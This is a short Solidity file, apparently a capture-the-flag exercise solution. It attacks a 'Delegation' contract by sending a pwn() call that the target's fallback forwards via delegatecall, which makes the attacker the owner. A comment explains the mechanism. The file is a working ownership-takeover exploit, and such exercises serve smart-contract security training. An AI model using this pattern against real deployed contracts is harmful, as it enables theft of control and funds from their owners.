// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        //delegation contract
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        // we pass the pwn() function, and this is called in the fallback function since fallback is called if there is no identifiable function. Fallback forward the pwn() call to delegate because we use delegate call, and this sets the owner of the delegation contrat to be the attacker (delegatecall sets the vairables of the calling contract)
        contractAddress.call(abi.encodeWithSignature("pwn()"));
    }
}
